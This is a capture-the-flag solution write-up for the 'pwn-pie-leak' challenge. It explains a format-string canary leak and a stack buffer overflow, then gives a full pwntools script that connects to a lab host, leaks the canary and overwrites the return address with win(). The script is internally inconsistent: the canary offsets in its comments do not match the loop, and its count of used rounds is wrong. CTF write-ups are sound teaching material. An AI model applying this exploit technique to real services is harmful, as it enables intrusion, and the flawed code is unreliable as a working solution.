# pwn-pie-leak — Solution

## Binary Properties
- PIE + ASLR (randomized)
- Stack canary
- NX
- Full RELRO
- Format string filter: `%n` blocked, `%p` allowed

## Vulnerability
1. Filtered `printf(fmt)` — read-only format string (%p leaks allowed)
2. `read(STDIN_FILENO, overflow_buf, 144)` into `overflow_buf[64]` — 80-byte overflow

## Strategy

### Step 1 — Address leaks (5 rounds)
Binary already prints `win()` address → compute PIE base.

Use `%p` format strings to leak:
- Stack canary (look for value with \x00 low byte)
- Saved return address (to verify PIE base)

Format: `%15$p` (single pointer at position 15 on stack).

### Step 2 — Overflow with canary bypass
Stack layout of `interact()`:
```
[buf: 64][overflow_buf: 64][canary: 8][saved rbp: 8][saved rip: 8]
```
Offset from `overflow_buf` start to canary = 64 bytes.
Total payload = 64 (padding) + 8 (canary) + 8 (rbp junk) + 8 (win addr) = 88 bytes.

## Exploit

```python
from pwn import *

HOST = '172.30.3.31'
PORT = 9998

def start(): return remote(HOST, PORT)

p = start()

# Step 1: get win() address -> PIE base
p.recvuntil(b'win=')
win_addr = int(p.recvline().strip(), 16)
log.success(f'win: {win_addr:#x}')

# Use format string rounds to find canary
# Round 5: find canary position
# Try positions 17-25 looking for a value with \x00 LSB

canary = None
for pos in range(1, 6):
    offset = 17 + pos  # typical range for canary on stack
    p.sendlineafter(b'fmt> ', f'%{offset}$p'.encode())
    p.recvuntil(b'\n')
    resp = p.recvline().strip()
    try:
        val = int(resp, 16)
        if val & 0xff == 0 and 0x100000000 < val:
            canary = val
            log.success(f'canary at %{offset}$p: {canary:#x}')
            break
    except:
        pass
    if canary:
        break

# Exhaust remaining rounds with dummy inputs
used = 1  # we used 1 round above
for _ in range(5 - used):
    p.sendlineafter(b'fmt> ', b'hello')
    p.recvline()

if not canary:
    log.warning('Canary not found! Adjust offset.')
    canary = 0x0  # placeholder

# Step 2: overflow
# overflow_buf is 64 bytes, then canary, rbp, rip
payload  = b'A' * 64          # fill overflow_buf
payload += p64(canary)        # canary (preserved)
payload += p64(0x4141414141414141)  # saved rbp
payload += p64(win_addr)      # overwrite return address

p.sendafter(b'Now, overflow: ', payload)
p.recvuntil(b'Thanks!')
p.interactive()
```

## Notes
- Canary position varies — try offsets 15-25 in format string: look for `(nil)` neighbors and value ending `00`
- `win()` address is printed → PIE base is trivially computed: `pie_base = win - offset_of_win_in_binary`
- Canary must be preserved exactly or the program crashes before reaching the overwritten `rip`
